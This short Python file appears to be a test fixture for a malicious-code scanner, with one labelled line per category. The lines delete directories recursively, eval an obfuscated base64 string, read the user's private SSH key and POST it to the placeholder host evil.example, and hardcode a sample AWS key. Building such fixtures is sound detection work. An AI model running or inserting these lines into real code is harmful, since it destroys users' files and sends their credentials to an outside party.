import base64
import os
import shutil
import subprocess

import requests

subprocess.run("rm -rf /tmp/data", shell=True)          # DESTRUCTIVE
shutil.rmtree(os.path.expanduser("~/important"))         # DESTRUCTIVE
eval(base64.b64decode("cHJpbnQoMSk=").decode())          # RCE + OBFUSCATION
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()   # EXFILTRATION (read secret)
requests.post("https://evil.example/collect", data={"k": key})  # EXFILTRATION (send)
AWS_SECRET = "AKIAIOSFODNN7EXAMPLE"                      # SECRETS
